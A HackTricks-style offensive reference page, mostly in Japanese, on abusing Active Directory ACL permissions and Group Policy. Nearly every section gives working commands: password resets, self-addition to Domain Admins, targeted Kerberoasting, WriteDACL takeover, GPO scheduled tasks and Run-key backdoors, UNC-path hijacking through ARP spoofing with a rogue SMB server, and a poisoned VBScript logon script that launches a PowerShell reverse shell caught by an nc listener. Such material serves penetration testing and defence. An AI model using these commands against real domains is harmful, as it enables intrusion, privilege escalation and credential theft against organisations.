# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**このページは主に、次の技術を要約したものです** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**。詳細は元記事を確認してください。**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

この権限は、攻撃者に対象ユーザーアカウントへの完全な制御権を与えます。`Get-ObjectAcl` コマンドで `GenericAll` 権限が確認できた場合、攻撃者は次のことができます:

- **Target の Password を変更する**: `net user <username> <password> /domain` を使って、攻撃者はユーザーの password をリセットできます。
- Linux からは、Samba `net rpc` を使って SAMR 経由で同じことができます:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **アカウントが無効化されている場合は、UACフラグを解除する**: `GenericAll` は `userAccountControl` の編集を許可する。Linux からは、BloodyAD を使って `ACCOUNTDISABLE` フラグを削除できる:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: SPN をユーザーのアカウントに割り当てて kerberoastable にし、その後 Rubeus と targetedKerberoast.py を使って ticket-granting ticket (TGT) のハッシュを抽出し、クラックを試みます。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: ユーザーの pre-authentication を無効化し、そのアカウントを ASREPRoasting に対して脆弱にする。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: ユーザーに対して `GenericAll` があると、証明書ベースの credential を追加して、パスワードを変更せずにそのユーザーとして認証できます。参照:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group に対する GenericAll Rights**

この権限により、攻撃者は `Domain Admins` のような group に対して `GenericAll` 権限を持っている場合、そのメンバーシップを操作できます。`Get-NetGroup` で group の distinguished name を特定した後、攻撃者は次のことができます。

- **自分自身を Domain Admins Group に追加する**: これは直接コマンドで実行することも、Active Directory や PowerSploit のような modules を使って実行することもできます。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linuxからでも、対象グループに対してGenericAll/Write membershipを持っている場合、BloodyADを使って自分自身を任意のグループに追加できます。対象グループが“Remote Management Users”にネストされている場合、そのグループを許可するホストで即座にWinRMアクセスを得られます:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

コンピュータオブジェクトまたはユーザーアカウントに対してこれらの権限を持っていると、次が可能になります:

- **Kerberos Resource-based Constrained Delegation**: コンピュータオブジェクトを乗っ取ることができます。
- **Shadow Credentials**: shadow credentials を作成する権限を悪用して、この technique を使いコンピュータまたはユーザーアカウントになりすますことができます。

## **WriteProperty on Group**

ユーザーが特定のグループ（例: `Domain Admins`）のすべてのオブジェクトに対して `WriteProperty` 権限を持っている場合、次が可能です:

- **Add Themselves to the Domain Admins Group**: `net user` と `Add-NetGroupUser` コマンドを組み合わせることで実現でき、この method により domain 内で権限昇格できます。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

この権限により、攻撃者は `Domain Admins` などの特定のグループに対して、グループメンバーシップを直接操作するコマンドを使って自分自身を追加できます。以下のコマンドシーケンスを使うと、自分自身を追加できます:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

同様の権限で、攻撃者は対象グループに対する `WriteProperty` 権限を持っている場合、グループのプロパティを変更して自分自身をグループに直接追加できます。この権限の確認と実行は次のとおりです:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

ユーザーに対して `User-Force-Change-Password` の `ExtendedRight` を保持していると、現在のパスワードを知らなくてもパスワードのリセットが可能になります。この権限の確認と悪用は PowerShell や代替のコマンドラインツールで行え、対話型セッションや非対話型環境向けのワンライナーを含む、ユーザーのパスワードをリセットする複数の方法を提供します。コマンドは単純な PowerShell 実行から Linux 上の `rpcclient` の使用まで幅広く、攻撃ベクトルの多様性を示しています。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Group の WriteOwner**

攻撃者が、ある group に対して `WriteOwner` 権限を持っていることを見つけた場合、その group の所有者を自分自身に変更できます。これは対象の group が `Domain Admins` の場合に特に影響が大きく、所有者を変更することで group の属性や membership に対してより広い制御が可能になります。手順としては、`Get-ObjectAcl` で正しい object を特定し、次に `Set-DomainObjectOwner` を使って、SID または name によって owner を変更します。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **ユーザーに対する GenericWrite**

この権限により、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite` アクセスがあると、攻撃者はユーザーのログオンスクリプトのパスを変更し、ユーザーのログオン時に悪意のあるスクリプトを実行させることができます。これは、`Set-ADObject` コマンドを使用して、対象ユーザーの `scriptpath` プロパティを攻撃者のスクリプトを指すように更新することで実現されます。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **グループに対するGenericWrite**

この権限を使うと、攻撃者はグループメンバーシップを操作でき、たとえば自分自身や他のユーザーを特定のグループに追加できます。この手順では、credential object を作成し、それを使ってグループへのユーザーの追加や削除を行い、PowerShell コマンドでメンバーシップの変更を確認します。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux からは、Samba `net` を使って、グループに対して `GenericWrite` を持っている場合にメンバーを追加/削除できます（PowerShell/RSAT が使えないときに便利です）：
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

ADオブジェクトを所有し、その上で `WriteDACL` 権限を持っていると、攻撃者はそのオブジェクトに対して自分自身へ `GenericAll` 権限を付与できます。これは ADSI の操作によって実現され、オブジェクトを完全に制御し、そのグループメンバーシップを変更する能力も得られます。とはいえ、Active Directory モジュールの `Set-Acl` / `Get-Acl` cmdlets を使ってこれらの権限を悪用しようとすると、制限が存在します。
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

ユーザーまたはサービスアカウントに対して `WriteOwner` と `WriteDacl` を持っている場合、PowerView を使って古いパスワードを知らなくても完全に制御を奪い、パスワードをリセットできます:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notes:
- `WriteOwner` のみを持っている場合は、まず所有者を自分自身に変更する必要があるかもしれません:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- パスワードリセット後、任意のプロトコル(SMB/LDAP/RDP/WinRM)でアクセスを検証する。

## **ドメイン上のReplication (DCSync)**

DCSync attackは、ドメイン上の特定のreplication権限を利用してDomain Controllerを模倣し、ユーザー認証情報を含むデータを同期します。この強力な手法には、`DS-Replication-Get-Changes` のような権限が必要で、攻撃者はDomain Controllerへ直接アクセスせずにAD環境から機密情報を抽出できます。[**DCSync attackの詳細はこちら。**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) の管理を委任されたアクセスは、重大なセキュリティリスクをもたらす可能性があります。例えば、`offense\spotless` のようなユーザーに GPO 管理権限が委任されている場合、**WriteProperty**、**WriteDacl**、**WriteOwner** のような権限を持つことがあります。これらの権限は悪意ある目的で悪用でき、PowerView を使うと次のように確認できます: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

誤設定された GPO を特定するには、PowerSploit の cmdlets を連結して使用できます。これにより、特定のユーザーが管理権限を持つ GPO を発見できます: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**特定のポリシーが適用されているコンピュータ**: 特定の GPO がどのコンピュータに適用されているかを解決でき、潜在的な影響範囲の把握に役立ちます。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**特定のコンピュータに適用されているポリシー**: 特定のコンピュータにどのポリシーが適用されているかを確認するには、`Get-DomainGPO` のようなコマンドを利用できます。

**特定のポリシーが適用されている OUs**: あるポリシーの影響を受ける組織単位(OUs)を特定するには、`Get-DomainOU` を使用できます。

また、[**GPOHound**](https://github.com/cogiceo/GPOHound) を使って GPO を列挙し、問題を見つけることもできます。

### Abuse GPO - New-GPOImmediateTask

誤設定された GPO は、たとえば即時スケジュールタスクを作成することでコード実行に悪用できます。これにより、影響を受けるマシンのローカル administrators グループにユーザーを追加でき、権限を大幅に昇格できます:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module は、インストールされている場合、新しい GPO の作成とリンクを可能にし、影響を受けるコンピュータ上でバックドアを実行するための registry values などの preferences を設定できます。この手法では、実行のために GPO が更新され、ユーザーがそのコンピュータにログインする必要があります:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPOの悪用

SharpGPOAbuseは、新しいGPOを作成する必要なく、タスクを追加したり設定を変更したりして既存のGPOを悪用する方法を提供します。このツールは、既存のGPOの変更、または変更を適用する前にRSATツールを使って新しいGPOを作成することを必要とします:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO updatesは通常、およそ90分ごとに行われます。これを早めるために、特に変更を適用した直後は、対象コンピュータで `gpupdate /force` コマンドを使って即時にポリシー更新を強制できます。このコマンドにより、次の自動更新サイクルを待たずに、GPOへの変更が適用されます。

### Under the Hood

`Misconfigured Policy` のような特定のGPOの Scheduled Tasks を確認すると、`evilTask` のようなタスクが追加されていることを確認できます。これらのタスクは、システムの挙動を変更したり権限を昇格させたりすることを目的としたスクリプトやコマンドラインツールによって作成されます。

`New-GPOImmediateTask` によって生成されたXML設定ファイルに示されるタスクの構造は、実行されるコマンドやトリガーを含む Scheduled Task の詳細を定義しています。このファイルは、Scheduled Tasks がGPO内でどのように定義・管理されるかを表しており、ポリシー適用の一環として任意のコマンドやスクリプトを実行する方法を提供します。

### Users and Groups

GPOは、対象システム上のユーザーおよびグループのメンバーシップを操作することもできます。Users and Groups のポリシーファイルを直接編集することで、攻撃者はユーザーをローカルの `administrators` グループのような特権グループに追加できます。これは、GPO管理権限の委任によって可能になり、ポリシーファイルを変更して新しいユーザーを追加したり、グループメンバーシップを変更したりできます。

Users and Groups 用のXML設定ファイルには、これらの変更がどのように実装されるかが示されています。このファイルにエントリを追加することで、影響を受けるシステム全体で特定のユーザーに昇格した権限を付与できます。この方法は、GPOの操作を通じて特権昇格を行う直接的なアプローチを提供します。

さらに、コードの実行や永続化のための追加手法、たとえば logon/logoff scripts の利用、autoruns 用のレジストリキーの変更、.msi ファイル経由でのソフトウェアインストール、サービス設定の編集なども考えられます。これらの手法は、GPOの悪用を通じてアクセスを維持し、対象システムを制御するためのさまざまな手段を提供します。

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domain に対する `WriteGPLink` を使うと、GPO自体を編集せずに対象コンテナの `gPLink` 属性を変更し、**既存のGPOを強制的に適用**できます。これが特に有用なのは、リンクされているGPOがすでに **UNC paths** (`\\HOST\share\...`) 経由のリモートコンテンツを参照している場合です。認証済みユーザーは **SYSVOL** を読み取り可能なので、再利用できるポリシーをオフラインで探せます。

高レベルの流れ:

1. BloodHound を使って、OU に対して `WriteGPLink` を持つ主体を特定し、そのOU内のコンピュータ/ユーザーを列挙する。
2. `SYSVOL` を読み取り専用でコピーし、GPOを解析して、**Software Installation**、ドライブマッピング（`Drives.xml`）、および UNC paths を参照する **logon/startup scripts** を探す。
3. DFS/domain-namespace のパスよりも、**直接ホスト名** を指すポリシー（たとえば `\\DC02\share\pkg.msi`）を優先する。ホスト名ベースのパスのほうが L2 spoofing でリダイレクトしやすいため。
4. 選んだ GPO GUID を対象OUの `gPLink` に追加し、被害者にその既存ポリシーを処理させる。
5. 同じ broadcast domain 上で、UNC ホストに対して ARP spoof を行い、そのIPをローカルにバインドする (`ip addr add <target_ip>/32 dev <iface>`)。これにより、被害者のSMBトラフィックが自分のホストに届く。
6. 攻撃者側の SMB server（たとえば `smbserver.py`）から期待されるパス/ファイル名を提供し、通常のポリシー処理を待つ。

`SYSVOL` の収集と GPO の対応付けの例:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
既存のGPOをターゲットOUにリンクする:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

リンクされたGPOがUNCパスからMSIを配布する場合、クライアントは**コンピュータの起動時**にそれを取得し、**`NT AUTHORITY\SYSTEM`**としてインストールします。参照先ホストを偽装し、**同じ share/path/name** で悪意あるMSIを配信することで、**SYSVOLを変更せずに** `WriteGPLink` をSYSTEMコード実行に変えられます。

重要な制約:

- **タイミングが重要**: 新しいリンクはポリシー更新時（通常約90分後）に反映されますが、**Software Installation** は通常**再起動時**に実行されます。
- Windows Installer は通常、パッケージの **`ProductCode`** を使って配布を追跡します。製品がすでにインストールされている場合、配布はスキップされることがあります。
- インストーラの拒否を避けるため、rogue MSI の **`ProductCode`** と **`PackageCode`** を、GPO が期待する正規パッケージに合わせてパッチします。
- 古い `.aas` advertisement ファイルが **SYSVOL** に残っていることがあるため、頼る前に配布がまだ有効に見えるか確認してください。
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` の GPP drive mappings は、logon または再接続時に users が設定された UNC path へ authenticate する原因になります。参照先 host を spoof すれば、**NetNTLMv2** を capture できます。SMB を意図的に失敗させると、Windows は **WebDAV** 経由で再試行し、**NTLM over HTTP** を送信する場合があります。これは **LDAP(S)**、**AD CS**、または **SMB** への relay に対して、はるかに柔軟です。

#### Logon/startup script UNC hijack

同じパターンは、`SYSVOL` で見つかる UNC-hosted scripts にも適用されます:

- **Logon scripts** は通常、**user** context で実行されます。
- **Startup scripts** は通常、**computer / SYSTEM** context で実行されます。

script path が spoof 可能な hostname を指している場合、UNC host を redirect して、期待される location から replacement script content を提供します。

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` または `\\<dc>\NETLOGON\` 配下の writable paths を使うと、GPO 経由で user logon 時に実行される logon scripts を tampering できます。これにより、logging users の security context で code execution が可能になります。

### Locate logon scripts
- Inspect user attributes for a configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- domain shares をクロールして、scripts への shortcuts や references を見つける:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` ファイルを解析して、SYSVOL/NETLOGON を指すターゲットを解決する（DFIR の便利な手法であり、GPO に直接アクセスできない攻撃者にも有用）:
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound は、存在する場合、user ノード上の `logonScript` (scriptPath) 属性を表示します。

### 書き込みアクセスを検証する（share listings を信用しない）
自動化ツールは SYSVOL/NETLOGON を read-only と表示することがありますが、基盤となる NTFS ACL では書き込みが許可されている場合があります。必ずテストしてください:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
### RCE のために VBScript ログオンスクリプトを Poison する
PowerShell reverse shell（revshells.com から生成）を起動するコマンドを追加し、業務機能を壊さないように元のロジックを保持する:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
ホストで待機し、次の対話型ログオンを待ち受ける:
```bash
rlwrap -cAr nc -lnvp 443
```
注意:
- 実行は logging user の token 配下で行われます（SYSTEM ではありません）。対象範囲は、その script を適用する GPO link（OU、site、domain）です。
- 使用後は元の内容/timestamps を復元してクリーンアップしてください。


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
